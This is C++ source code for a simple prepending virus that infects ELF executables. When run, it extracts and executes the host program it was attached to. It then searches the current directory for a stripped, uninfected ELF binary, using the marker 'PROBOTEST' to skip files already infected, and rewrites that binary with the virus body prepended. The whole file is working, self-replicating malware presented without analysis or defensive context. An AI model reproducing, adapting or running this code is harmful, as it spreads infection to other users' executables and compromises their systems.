#include <iostream>
#include <fstream>

const char* IDENTIFIER = "PROBOTEST";

const int MYSIZE = 14752;

using namespace std;

int main (int argc, char** argv) {
    int c;
    string exe = "./exe__", vir = "vir";
    string me = (string)argv[0], command;
    ifstream fi(me);
    ofstream fo(exe);
    ofstream fv(vir);
    if (fi.is_open() && fo.is_open() && fv.is_open()) {
        // Write "vir"
        for (int i = 0; i < MYSIZE; i++) fv << (char)fi.get();
        // Write "exe"
        fi.seekg(MYSIZE, fi.beg);
        while ((c = fi.get()) != -1) fo << (char)c;
        fi.close();
        fo.close();
        fv.close();
        // Construct command line plus arguments
        command = "chmod u+x ";
        command += exe;
        command += " && ";
        command += exe;
        if (argc > 1) {
            for (int i = 1; i < argc; i++) {
                command += " ";
                command += (string)argv[i];
            }
        }
        command += " && rm -f ";
        command += exe;
        // Excute original program command line
        // and delete when ready
        c = system( (command).c_str() );
        // Infect one executable
        c = system("VIR=$(for n in `find -mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
do \
file $n | grep -q ELF && ( \
grep -q PROBOTEST $n || ( \
echo \"$n\" \
) \
); \
done | tail -1); \
if [ ! -z \"$VIR\" ]; then \
file $VIR | grep -q stripped$ && (\
mv $VIR ${VIR}__ && \
cat vir ${VIR}__ >$VIR && \
chmod ugo+x $VIR \
) \
fi; \
rm -f ${VIR}__ vir");
    }
}